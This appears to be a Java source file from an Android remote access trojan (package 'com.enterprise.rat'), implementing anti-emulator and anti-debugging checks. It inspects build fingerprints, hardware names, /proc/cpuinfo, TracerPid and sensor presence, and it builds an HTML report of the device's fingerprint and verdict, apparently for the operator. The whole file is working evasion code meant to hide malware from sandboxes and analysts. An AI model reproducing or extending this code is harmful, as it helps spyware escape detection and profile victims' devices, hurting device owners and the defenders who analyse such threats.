package com.enterprise.rat.utils;

import android.os.Build;
import android.os.Debug;
import com.enterprise.rat.MainApplication;
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class AntiVM {

    public static boolean isEmulator() {
        // 1. Build fingerprint
        String fingerprint = Build.FINGERPRINT;
        if (fingerprint.startsWith("generic") || fingerprint.startsWith("unknown") ||
            fingerprint.contains("sdk") || fingerprint.contains("emulator")) return true;

        // 2. Model & manufacturer
        String model = Build.MODEL.toLowerCase();
        String manufacturer = Build.MANUFACTURER.toLowerCase();
        if (model.contains("google_sdk") || model.contains("emulator") ||
            model.contains("android sdk built for x86") ||
            manufacturer.contains("genymotion")) return true;

        // 3. Hardware (goldfish/ranchu = emulator)
        String hardware = Build.HARDWARE.toLowerCase();
        if (hardware.contains("goldfish") || hardware.contains("ranchu")) return true;

        // 4. /proc/cpuinfo (QEMU/KVM detection)
        if (cpuInfoContainsEmulator()) return true;

        // 5. Tracer pid (debugger detection)
        if (Debug.isDebuggerConnected()) return true;
        if (hasTracerPid()) return true;

        // 6. Sensor absence
        if (isEmulatorFromSensors()) return true;

        return false;
    }

    private static boolean cpuInfoContainsEmulator() {
        try {
            Process p = Runtime.getRuntime().exec("cat /proc/cpuinfo");
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                if (line.toLowerCase().contains("qemu") || line.toLowerCase().contains("kvm")) return true;
            }
        } catch (Exception e) {}
        return false;
    }

    private static boolean hasTracerPid() {
        try {
            BufferedReader reader = new BufferedReader(new InputStreamReader(
                new java.io.FileInputStream("/proc/self/status")));
            String line;
            while ((line = reader.readLine()) != null) {
                if (line.startsWith("TracerPid:")) {
                    return Integer.parseInt(line.substring(10).trim()) != 0;
                }
            }
        } catch (Exception e) {}
        return false;
    }

    private static boolean isEmulatorFromSensors() {
        try {
            android.hardware.SensorManager sm = (android.hardware.SensorManager)
                MainApplication.getAppContext().getSystemService(android.content.Context.SENSOR_SERVICE);
            if (sm == null) return true;
            boolean hasMag = sm.getDefaultSensor(android.hardware.Sensor.TYPE_MAGNETIC_FIELD) != null;
            boolean hasProx = sm.getDefaultSensor(android.hardware.Sensor.TYPE_PROXIMITY) != null;
            return !hasMag && !hasProx;
        } catch (Exception e) {
            return false;
        }
    }

    public static String getDetectionReport() {
        StringBuilder report = new StringBuilder("<b>🛡 Anti-VM Scan Report</b>\n\n");
        report.append("<b>Fingerprint:</b> <code>").append(Build.FINGERPRINT).append("</code>\n");
        report.append("<b>Hardware:</b> <code>").append(Build.HARDWARE).append("</code>\n");
        report.append("<b>Debugger:</b> ").append(Debug.isDebuggerConnected() ? "⚠ YES" : "✅ No").append("\n");
        report.append("<b>TracerPid:</b> ").append(hasTracerPid() ? "⚠ YES" : "✅ 0").append("\n");
        report.append("<b>CPU Emu:</b> ").append(cpuInfoContainsEmulator() ? "⚠ YES" : "✅ No").append("\n");
        report.append("<b>Verdict:</b> <b>").append(isEmulator() ? "🔴 EMULATOR" : "🟢 REAL DEVICE").append("</b>");
        return report.toString();
    }
}
